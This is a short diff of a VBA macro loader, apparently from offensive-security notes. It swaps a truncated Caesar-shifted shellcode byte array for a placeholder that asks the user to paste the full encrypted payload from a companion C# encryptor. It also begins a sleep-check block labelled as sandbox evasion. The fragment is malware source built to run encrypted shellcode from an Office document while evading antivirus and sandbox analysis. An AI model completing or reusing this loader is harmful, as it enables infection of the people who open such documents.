@@ -30,10 +30,9 @@ Function mymacro()
     Dim i As Long
     
     ' --- Encrypted shellcode (Caesar +2) ---
-    buf = Array(254, 132, 2, 2, 2, 98, 139, 231, 51, 194, 102, _
-                141, 82, 50, 141, 84, 14, 141, 84, 22, 141, 116, _
-                42, 17, 185, 76, 40, 51, 1, 174, 62, 99, ...) 
-    ' (truncated for notes, full payload goes here)
+    ' Paste the decimal Array(...) printed by vba-caesar-cipher-encryption.cs here.
+    ' It is decrypted with -2 at runtime.
+    buf = Array(0)  ' ← TODO: replace with the FULL encrypted array
 
     ' --- Time-lapse Evasion (Sleep Check) ---
     Dim t1 As Date, t2 As Date, elapsed As Long
